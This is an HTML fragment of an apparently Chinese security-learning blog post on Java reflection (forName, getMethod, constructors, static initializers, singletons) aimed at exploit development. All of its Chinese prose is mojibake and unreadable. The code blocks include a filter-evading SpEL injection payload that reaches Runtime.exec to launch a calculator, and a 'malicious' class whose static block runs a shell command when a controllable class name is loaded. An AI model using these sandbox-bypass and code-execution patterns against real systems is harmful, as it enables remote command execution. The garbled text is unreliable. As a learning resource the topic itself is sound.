id="æ–¹æ³•ä¸‰ã€Class-forName-String-className-ï¼š"><a href="#æ–¹æ³•ä¸‰ã€Class-forName-String-className-ï¼š" class="headerlink" title="æ–¹æ³•ä¸‰ã€Class.forName(String className)ï¼š"></a>æ–¹æ³•ä¸‰ã€Class.forName(String className)ï¼š</h4><p>å¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿â½¤ <code>forName</code> æ¥è·å–ï¼Œåç»­è¦åˆ©ç”¨çš„è¯æ˜¯éœ€è¦å®ä¾‹åŒ–çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">class1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;reflection.TestReflection&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="2-è·å–æˆå‘˜å˜é‡-Field"><a href="#2-è·å–æˆå‘˜å˜é‡-Field" class="headerlink" title="2. è·å–æˆå‘˜å˜é‡ Field"></a>2. è·å–æˆå‘˜å˜é‡ Field</h3><p>è·å–æˆå‘˜å˜é‡Fieldä½äº <code>java.lang.reflect.Field</code> åŒ…ä¸­</p><p>Field[] getFields() ï¼šè·å–æ‰€æœ‰ public ä¿®é¥°çš„æˆå‘˜å˜é‡</p><p>Field[] getDeclaredFields() è·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦</p><p>Field getField(String name) è·å–æŒ‡å®šåç§°çš„ public ä¿®é¥°çš„æˆå‘˜å˜é‡</p><p>Field getDeclaredField(String name) è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡</p><h3 id="3-è·å–æˆå‘˜æ–¹æ³•-Method-éƒ½ä¸åŒ…å«æ„é€ å‡½æ•°"><a href="#3-è·å–æˆå‘˜æ–¹æ³•-Method-éƒ½ä¸åŒ…å«æ„é€ å‡½æ•°" class="headerlink" title="3. è·å–æˆå‘˜æ–¹æ³• Method(éƒ½ä¸åŒ…å«æ„é€ å‡½æ•°)"></a>3. è·å–æˆå‘˜æ–¹æ³• Method(éƒ½ä¸åŒ…å«æ„é€ å‡½æ•°)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">(String name, ç±»&lt;?&gt;... parameterTypes)</span> <span class="hljs-comment">//è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„publicæ–¹æ³•</span><br><br>Method <span class="hljs-title function_">getDeclaredMethod</span><span class="hljs-params">(String name, ç±»&lt;?&gt;... parameterTypes)</span> <span class="hljs-comment">//è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„æ‰€æœ‰æ–¹æ³•</span><br><br><span class="hljs-comment">//ç¬¬ä¸€ä¸ªå‚æ•°è·å–è¯¥æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°è·å–æ ‡è¯†è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹</span><br><br>Method[] getMethods() <span class="hljs-comment">//è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³•</span><br><br>Method[] getDeclaredMethods() <span class="hljs-comment">// è·å–è¯¥ç±»ä¸­çš„æ‰€æœ‰å£°æ˜æ–¹æ³•ï¼ŒåŒ…æ‹¬ç§æœ‰çš„ï¼Œä¸åŒ…æ‹¬çˆ¶ç±»ç»§æ‰¿çš„</span><br></code></pre></td></tr></table></figure><p>åœ¨ <strong>Person.java</strong> ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">(String s)</span> &#123;  <br>    System.out.println(<span class="hljs-string">&quot;å­¦ä¹ ä¸­...&quot;</span> + s);  <br>&#125;  <br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">sleep</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;  <br>    System.out.println(<span class="hljs-string">&quot;ç¡çœ ä¸­...&quot;</span> + age);  <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;sleep&quot;</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>å¹¶åœ¨ <strong>ReflectionTest02.java</strong> ä¸­æ·»åŠ å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <br>  <br><span class="hljs-keyword">import</span> com.sun.xml.internal.ws.encoding.MtomCodec;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionTest02</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.Person&quot;</span>);<span class="hljs-comment">// åˆ›å»º Class å¯¹è±¡  </span><br> Method[] methods1 = c1.getDeclaredMethods();<span class="hljs-comment">// è·å–æ‰€æœ‰è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•  </span><br> Method[] methods2 = c1.getMethods();<span class="hljs-comment">// è·å–æ‰€æœ‰çš„ public æ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„ public æ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„  ã€å®ç°çš„æ¥å£æ–¹æ³•  </span><br>  <br> <span class="hljs-keyword">for</span> (Method m:methods1)&#123;  <br>            System.out.println(m);  <br> &#125;  <br>        System.out.println(<span class="hljs-string">&quot;-------åˆ†å‰²çº¿---------&quot;</span>);  <br>  <br> <span class="hljs-keyword">for</span> (Method m:methods2) &#123;  <br>            System.out.println(m);  <br> &#125;  <br>  <br>        System.out.println(<span class="hljs-string">&quot;-------åˆ†å‰²çº¿---------&quot;</span>);  <br>  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">methods3</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;study&quot;</span>, String.class);<span class="hljs-comment">// è·å– Public çš„ study æ–¹æ³•  </span><br> System.out.println(methods3);  <br> System.out.println(<span class="hljs-string">&quot;-------åˆ†å‰²çº¿---------&quot;</span>);  <br>  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">methods4</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-type">int</span>.class); <span class="hljs-comment">// è·å– Private çš„ sleep æ–¹æ³•  </span><br> System.out.println(methods4);  <br> &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a02.png"></p><h3 id="4-è·å–æ„é€ å‡½æ•°"><a href="#4-è·å–æ„é€ å‡½æ•°" class="headerlink" title="4. è·å–æ„é€ å‡½æ•°"></a>4. è·å–æ„é€ å‡½æ•°</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Constructor&lt;?&gt;[] getConstructors() ï¼šåªè¿”å›<span class="hljs-keyword">public</span>æ„é€ å‡½æ•°<br><br>Constructor&lt;?&gt;[] getDeclaredConstructors() ï¼šè¿”å›æ‰€æœ‰ç”Ÿå‘½çš„æ„é€ å‡½æ•°<br><br>Constructor&lt;&gt; getConstructor(ç±»&lt;?&gt;... parameterTypes) : åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„<span class="hljs-keyword">public</span>æ„é€ å‡½æ•°<br><br>Constructor&lt;&gt; getDeclaredConstructor(ç±»&lt;?&gt;... parameterTypes) ï¼š åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•°<br></code></pre></td></tr></table></figure><h2 id="åå°„æ¶‰åŠçš„æ–¹æ³•"><a href="#åå°„æ¶‰åŠçš„æ–¹æ³•" class="headerlink" title="åå°„æ¶‰åŠçš„æ–¹æ³•"></a>åå°„æ¶‰åŠçš„æ–¹æ³•</h2><h3 id="forNameæ–¹æ³•"><a href="#forNameæ–¹æ³•" class="headerlink" title="forNameæ–¹æ³•"></a>forNameæ–¹æ³•</h3><p>forName ä¸ï¥§æ˜¯è·å–â€œç±»â€çš„å”¯ä¸€é€”å¾„ï¼Œé€šå¸¸æ¥è¯´æˆ‘ä»¬æœ‰å¦‚ä¸‹ä¸‰ç§æ–¹å¼è·å–ä¸€ä¸ªâ€œç±»â€ï¼Œä¹Ÿå°± æ˜¯java.lang.Classå¯¹è±¡ï¼š</p><ul><li>obj.getClass() å¦‚æœä¸Šä¸‹æ–‡ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ï¦µobj ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡obj.getClass() æ¥è·å–å®ƒçš„ç±» </li><li>Test.class å¦‚æœä½ å·²ç»åŠ è½½ï¦ºæŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„ java.lang.Class å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ‹¿å®ƒçš„ class å±æ€§å³å¯ã€‚è¿™ä¸ªæ–¹æ³•å…¶å®ï¥§å±äºåå°„ã€‚</li><li>Class.forName å¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿ç”¨ forName æ¥è·å–</li></ul><p>åœ¨å®‰å…¨ç ”ç©¶ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„çš„ä¸€å¤§ç›®çš„ï¼Œå°±æ˜¯ç»•è¿‡æŸäº›æ²™ç›’ã€‚æ¯”å¦‚ï¼Œä¸Šä¸‹æ–‡ä¸­å¦‚æœåªæœ‰Integerç±»å‹çš„æ•°å­—ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–åˆ°å¯ä»¥æ‰§ï¨ˆå‘½ä»¤çš„Runtimeç±»å‘¢ï¼Ÿä¹Ÿè®¸å¯ä»¥è¿™æ ·ï¼ˆä¼ªä»£ç ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span>getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br></code></pre></td></tr></table></figure><p>å…³äºç»•æ²™ç›’ï¼Œä¹‹å‰Code-Breaking 2018pç¥å‡ºäº†ä¸€é“SpELçš„é¢˜ç›®(å­¦ä¹ SpELæ³¨å…¥æ—¶è¿˜ç”¨æ¥åšå®ä¾‹è®°å½•äº†)</p><p><a href="http://rui0.cn/archives/1015">Code-Breaking Puzzles â€” javacon WriteUp â€“ Ruilin</a></p><p>å½“æ—¶çš„payload(å¼¹å‡ºè®¡ç®—å™¨)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ec&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRu&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="forNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š"><a href="#forNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š" class="headerlink" title="forNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š"></a>forNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š</h4><ul><li>Class forName(String name) </li><li>Class forName(String name, <strong>boolean</strong> initialize, ClassLoader loader)</li></ul><p> ç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€å¸¸è§çš„è·å–classçš„æ–¹å¼ï¼Œå…¶å®å¯ä»¥ï§¤è§£ä¸ºç¬¬äºŒç§æ–¹å¼çš„ä¸€ä¸ªå°è£…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(className)<br> <span class="hljs-comment">// ç­‰äº</span><br>Class.forName(className, <span class="hljs-literal">true</span>, currentLoader)<br></code></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ forName çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»åï¼›ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°å°± æ˜¯ClassLoader</p><h5 id="ç¬¬ä¸‰ä¸ªå‚æ•°ClassLoader"><a href="#ç¬¬ä¸‰ä¸ªå‚æ•°ClassLoader" class="headerlink" title="ç¬¬ä¸‰ä¸ªå‚æ•°ClassLoader"></a>ç¬¬ä¸‰ä¸ªå‚æ•°ClassLoader</h5><p>ClassLoader å°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½ï¨¸â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚Javaé»˜è®¤çš„ClassLoaderæ˜¯æ ¹æ®ç±»ååŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œå¦‚ java.lang.Runtime ã€‚</p><h5 id="ç¬¬äºŒä¸ªå‚æ•°initializeï¼š"><a href="#ç¬¬äºŒä¸ªå‚æ•°initializeï¼š" class="headerlink" title="ç¬¬äºŒä¸ªå‚æ•°initializeï¼š"></a>ç¬¬äºŒä¸ªå‚æ•°initializeï¼š</h5><p>åœ¨ forName çš„æ—¶å€™ï¼Œæ„é€ å‡½æ•°å¹¶ï¥§ä¼šæ‰§ï¨ˆï¼Œå³ä½¿æˆ‘ä»¬è®¾ç½®initialize&#x3D;trueã€‚</p><p>é‚£ä¹ˆè¿™ä¸ªåˆå§‹åŒ–ç©¶ç«ŸæŒ‡ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>å¯ä»¥å°†è¿™ä¸ªâ€œåˆå§‹åŒ–â€ï§¤è§£ä¸ºç±»çš„åˆå§‹åŒ–ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å¦‚ä¸‹è¿™ä¸ªç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainPrint</span> &#123;<br>    &#123;<br>        System.out.printf(<span class="hljs-string">&quot;Empty block initial %s\n&quot;</span>, <span class="hljs-built_in">this</span>.getClass());<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.printf(<span class="hljs-string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TrainPrint</span><span class="hljs-params">()</span> &#123;<br>        System.out.printf(<span class="hljs-string">&quot;Initial %s\n&quot;</span>, <span class="hljs-built_in">this</span>.getClass());<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>ä¸‰ä¸ªâ€œåˆå§‹åŒ–â€æ–¹æ³•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œè°ƒç”¨é¡ºåºæ˜¯ä»€ä¹ˆï¼Œåœ¨å®‰å…¨ä¸Šæœ‰ä»€ä¹ˆä»·å€¼?</p><p>é¦–å…ˆè°ƒç”¨çš„æ˜¯static {}ï¼Œå…¶æ¬¡æ˜¯{}ï¼Œæœ€åæ˜¯æ„é€ å‡½æ•°ã€‚</p><p>å…¶ä¸­ï¼Œstatic {}å°±æ˜¯åœ¨â€œç±»åˆå§‹åŒ–â€çš„æ—¶å€™è°ƒç”¨çš„ï¼Œè€Œ{}ä¸­çš„ä»£ç ä¼šæ”¾åœ¨æ„é€ å‡½æ•°çš„super()[è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•]åé¢ï¼Œ ä½†åœ¨å½“å‰æ„é€ å‡½æ•°å†…å®¹çš„å‰é¢ã€‚æ‰€ä»¥è¯´ï¼ŒforNameä¸­çš„initialize&#x3D;trueå…¶å®å°±æ˜¯å‘Šè¯‰Javaè™šæ‹Ÿæœºæ˜¯å¦æ‰§ï¨ˆâ€ç±»åˆå§‹åŒ–â€œã€‚</p><p>é‚£ä¹ˆï¼Œå‡è®¾æˆ‘ä»¬æœ‰å¦‚ä¸‹å‡½æ•°ï¼Œå…¶ä¸­å‡½æ•°çš„å‚æ•°nameå¯æ§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ref</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Class.forName(name);<br> &#125;<br>---<br>é™æ€æ–¹æ³•è°ƒç”¨ï¼Œç›´æ¥ç”¨ç±»åè°ƒç”¨ã€‚<br>ä½œç”¨ï¼šæ ¹æ®ç±»çš„å…¨é™å®šåï¼ˆåŒ…å + ç±»åï¼‰ï¼ŒåŠ è½½å¹¶åˆå§‹åŒ–ç±»ï¼ˆä¼šæ‰§è¡Œé™æ€ä»£ç å—ï¼‰ã€‚<br>name å¿…é¡»æ˜¯ç±»çš„å…¨é™å®šåï¼Œä¾‹å¦‚ <span class="hljs-string">&quot;com.example.MyClass&quot;</span>ã€‚<br>Class.forName() å±äº java.lang.Classï¼Œæ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œä¸éœ€è¦å¯¹è±¡å®ä¾‹ã€‚<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±å¯ä»¥ç¼–å†™ä¸€ä¸ªæ¶æ„ç±»ï¼Œå°†æ¶æ„ä»£ç æ”¾ç½®åœ¨static {}ä¸­ï¼Œä»è€Œæ‰§ï¨ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br> <span class="hljs-keyword">import</span> java.lang.Process;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchFile</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/success&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œé™¤äº†ç³»ç»Ÿç±»ï¼Œå¦‚æœæˆ‘ä»¬æƒ³æ‹¿åˆ°ä¸€ä¸ªç±»ï¼Œéœ€è¦å…ˆ import æ‰èƒ½ä½¿ç”¨ã€‚è€Œä½¿ç”¨forNameå°±ä¸éœ€è¦ï¼Œè¿™æ ·å¯¹äºæˆ‘ä»¬çš„æ”»å‡»è€…æ¥è¯´å°±ååˆ†æœ‰åˆ©ï¼Œæˆ‘ä»¬å¯ä»¥åŠ è½½ä»»æ„ç±»ã€‚</p><h3 id="newInstanceæ–¹æ³•-æ— å‚æ„é€ å‡½æ•°-å•ä¾‹æ¨¡å¼é™æ€æ–¹æ³•"><a href="#newInstanceæ–¹æ³•-æ— å‚æ„é€ å‡½æ•°-å•ä¾‹æ¨¡å¼é™æ€æ–¹æ³•" class="headerlink" title="newInstanceæ–¹æ³•(æ— å‚æ„é€ å‡½æ•°,å•ä¾‹æ¨¡å¼é™æ€æ–¹æ³•)"></a>newInstanceæ–¹æ³•(æ— å‚æ„é€ å‡½æ•°,å•ä¾‹æ¨¡å¼é™æ€æ–¹æ³•)</h3><p>æˆ‘ä»¬ç»å¸¸åœ¨ä¸€äº›æºç é‡Œçœ‹åˆ°ï¼Œç±»åçš„éƒ¨åˆ†åŒ…å«$ç¬¦å·ï¼Œæ¯”å¦‚fastjsonåœ¨checkAutoType æ—¶å€™å°±ä¼šå…ˆå°†$æ›¿æ¢æˆ . :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><p>$ çš„ä½œç”¨æ˜¯æŸ¥æ‰¾å†…éƒ¨ç±»ã€‚</p><p>Javaçš„æ™®é€šç±» C1 ä¸­æ”¯æŒç¼–å†™å†…éƒ¨ç±»C2ï¼Œè€Œåœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼š C1.class å’Œ C1$C2.class ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä»–ä»¬çœ‹ä½œä¸¤ä¸ªæ— å…³çš„ç±»ï¼Œé€šè¿‡ Class.forName(â€œC1$C2â€) å³å¯åŠ è½½è¿™ä¸ªå†…éƒ¨ç±»ã€‚</p><p>è·å¾—ç±»ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ä½¿ç”¨åå°„æ¥è·å–è¿™ä¸ªç±»ä¸­çš„å±æ€§,æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œå¹¶è°ƒç”¨æ–¹æ³•ã€‚</p><p>class.newInstance() çš„ä½œç”¨å°±æ˜¯è°ƒç”¨è¿™ä¸ªç±»çš„æ— å‚æ„é€ å‡½æ•°ï¼Œè¿™ä¸ªæ¯”è¾ƒå¥½ç†è§£ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™åœ¨å†™æ¼æ´åˆ©ç”¨æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå‘ç°ä½¿ç”¨ newInstance æ€»æ˜¯ä¸æˆåŠŸï¼Œè¿™æ—¶å€™åŸå› å¯èƒ½æ˜¯</p><ol><li>ä½ ä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° </li><li>ä½ ä½¿ç”¨çš„ç±»æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„</li></ol><p>æœ€æœ€æœ€å¸¸è§çš„æƒ…å†µå°±æ˜¯ java.lang.Runtime ï¼Œè¿™ä¸ªç±»åœ¨æˆ‘ä»¬æ„é€ å‘½ä»¤æ‰§è¡ŒPayloadçš„æ—¶å€™å¾ˆå¸¸è§ï¼Œä½† æˆ‘ä»¬ä¸èƒ½ç›´æ¥è¿™æ ·æ¥æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="hljs-string">&quot;id&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä¼šæŠ¥é”™</p><p>åŸå› æ˜¯ Runtime ç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„</p><h4 id="å•ä¾‹æ¨¡å¼"><a href="#å•ä¾‹æ¨¡å¼" class="headerlink" title="å•ä¾‹æ¨¡å¼"></a>å•ä¾‹æ¨¡å¼</h4><p>ç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„</p><p>æ¯”å¦‚ï¼Œå¯¹äºWebåº”ç”¨æ¥è¯´ï¼Œæ•°æ®åº“è¿æ¥åªéœ€è¦å»ºç«‹ä¸€æ¬¡ï¼Œè€Œä¸æ˜¯æ¯æ¬¡ç”¨åˆ°æ•°æ®åº“çš„æ—¶å€™å†æ–°å»ºç«‹ä¸€ä¸ªè¿æ¥ï¼Œæ­¤æ—¶ä½œä¸ºå¼€å‘è€…ä½ å°±å¯ä»¥å°†æ•°æ®åº“è¿æ¥ä½¿ç”¨çš„ç±»çš„æ„é€ å‡½æ•°è®¾ç½®ä¸ºç§æœ‰ï¼Œç„¶åç¼–å†™ä¸€ä¸ªé™æ€æ–¹æ³•æ¥è·å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainDB</span> &#123;<br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">TrainDB</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrainDB</span>();<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TrainDB <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br> <span class="hljs-keyword">return</span> instance;<br> &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">TrainDB</span><span class="hljs-params">()</span> &#123;<br> <span class="hljs-comment">// å»ºç«‹è¿æ¥çš„ä»£ç ...</span><br> 